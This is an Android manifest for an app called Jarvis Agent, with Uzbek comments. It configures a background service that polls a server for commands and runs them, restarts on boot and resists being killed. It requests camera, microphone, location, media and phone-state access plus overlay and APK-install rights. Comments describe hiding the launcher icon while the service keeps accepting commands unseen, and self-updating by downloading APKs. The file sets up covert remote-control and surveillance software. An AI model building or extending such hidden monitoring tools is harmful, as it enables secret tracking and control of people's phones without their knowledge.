<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <!-- Permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.BATTERY_STATS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <!-- "normal" himoya darajali ruxsatlar — o'rnatishda avtomatik beriladi, foydalanuvchidan
         so'ralmaydi. network_status/get_wifi_info buyruqlari uchun kerak. -->
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <!-- Ilova exit qilingandan/recents'dan o'chirilgandan keyin ham fon xizmati
         ishlashda davom etishi uchun — ayniqsa Infinix (XOS)/Xiaomi (MIUI) kabi
         agressiv batareya boshqaruvchi tizimlarda bu shart bo'lmasa xizmat
         daqiqalar ichida o'ldiriladi. -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <!-- Android 12+ da aniq alarm rejalashtirish uchun (onTaskRemoved va onDestroy'da ishlatiladi) -->
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
    <!-- ENG MUHIM: "Boshqa ilovalar ustidan chizish" — Android 10+ da fon xizmatidan
         ilova/sozlama/URL ochish (startActivity) FAQAT shu ruxsat bilan ishlaydi.
         Busiz barcha open_app/open_url/open_settings buyruqlari jimgina bloklanadi. -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <!-- Ilovaning o'zini avtomatik yangilashi uchun (yangi APK yuklab o'rnatish) -->
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />

    <uses-feature android:name="android.hardware.camera" android:required="false" />

    <application
        android:name=".JarvisApp"
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.JarvisAgent"
        android:networkSecurityConfig="@xml/network_security_config">

        <activity
            android:name=".ui.MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:windowSoftInputMode="adjustResize">
            <!-- LAUNCHER kategoriyasi atayin bu yerda emas — pastdagi activity-alias'da.
                 Shu tufayli ikonkani yashirish (alias'ni o'chirish) MainActivity'ning
                 o'zini yoki fon xizmatini o'chirmaydi, faqat ilova ro'yxatidagi
                 ikonkani yo'qotadi. -->
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
            </intent-filter>

            <!-- Deep link: jarvis://pair?device_id=...&token=...&server=... -->
            <intent-filter android:autoVerify="false">
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="jarvis" android:host="pair" />
            </intent-filter>
        </activity>

        <!-- Ilova ro'yxatidagi (launcher) ikonka — hide_app/show_app buyruqlari shu
             alias'ning yoqilgan/o'chirilganini almashtiradi. O'chirilganda ikonka
             yo'qoladi, lekin fon xizmati (AgentForegroundService) ishlashda davom
             etadi — buyruqlar hamon qabul qilinaveradi, faqat ekranda ko'rinmaydi. -->
        <activity-alias
            android:name=".LauncherAlias"
            android:targetActivity=".ui.MainActivity"
            android:exported="true"
            android:enabled="true"
            android:icon="@mipmap/ic_launcher"
            android:roundIcon="@mipmap/ic_launcher_round"
            android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- Background Agent Service — polls the server for commands and executes
             them; this is data sync, not a peripheral-device connection, so it
             uses the dataSync foreground service type. "connectedDevice" was wrong
             here and crashes on Android 14+ (API 34+): that type requires the app
             to also hold a companion permission (BLUETOOTH_CONNECT/SCAN, USB, NFC,
             etc.), none of which apply, so startForeground() throws
             MissingForegroundServiceTypeException the instant the service starts. -->
        <service
            android:name=".service.AgentForegroundService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- Boot receiver to restart agent -->
        <receiver
            android:name=".receiver.BootReceiver"
            android:exported="true"
            android:enabled="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

        <!-- WorkManager -->
        <provider
            android:name="androidx.startup.InitializationProvider"
            android:authorities="${applicationId}.androidx-startup"
            android:exported="false">
            <meta-data
                android:name="androidx.work.WorkManagerInitializer"
                android:value="androidx.startup" />
        </provider>

        <!-- Yangilanish APK'sini tizim o'rnatuvchisiga uzatish uchun -->
        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${applicationId}.fileprovider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

    </application>
</manifest>
